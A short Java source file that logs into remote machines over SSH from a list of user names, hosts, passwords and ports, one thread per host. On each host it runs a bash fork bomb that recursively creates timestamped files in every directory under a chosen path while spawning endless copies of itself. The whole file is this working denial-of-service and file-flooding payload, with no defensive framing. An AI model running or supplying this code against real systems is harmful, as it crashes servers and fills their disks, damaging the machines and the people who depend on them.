package vitor.dev;

import java.util.ArrayList;
import java.util.List;

import vitor.dev.connection.SSHConnection;

public class Main {
    public static void main(String[] args) {
        List<String[]> connectionData = new ArrayList<>();

        for (String[] data : connectionData) {
            new Thread(() -> {
                String user = data[0];
                String host = data[1];
                String password = data[2];
                String remotePath = data[3];
                int port = Integer.parseInt(data[4]);

                SSHConnection connection = new SSHConnection();
                connection.connect(user, host, password, port);
                connection.command(
                        String.format(
                                "bash -c ':() { " +
                                        "for D in $(find \"%s\" -type d); do " +
                                        "touch \"$D/vitor_$(date +%%s%%N).txt\"; " +
                                        "done; " +
                                        ":|: & " +
                                        "};:'",
                                remotePath),
                        password);
            }).start();
        }
    }
}
